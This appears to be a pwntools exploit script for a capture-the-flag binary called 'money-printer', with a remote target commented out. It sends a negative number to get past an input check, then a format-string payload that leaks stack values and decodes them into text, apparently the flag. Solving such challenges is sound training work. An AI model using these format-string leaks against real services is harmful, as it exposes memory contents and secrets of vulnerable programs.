import pwn
import time 
import warnings

warnings.filterwarnings(action='ignore', category = BytesWarning)


elf = pwn.ELF("./money-printer")
pwn.context.binary = elf 
pwn.context.log_level = "DEBUG" 
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = elf.libc 
p = elf.process()
#p = pwn.remote ("money.sdc.tf", "1337")
# Start
p.sendlineafter (b"want", "-10000")

p.sendlineafter("audience?", "".join(f"%{i}$p." for i in range(1, 25)))

p.recvuntil("said:")
line = p.recvline().strip().decode()
print(f"{line=}")


out=""
for c in line.split(" "):
    try:
        out += bytes.fromhex(c[2:])[::-1].decode()
    except:
        pass
print(out) 

p.interactive()
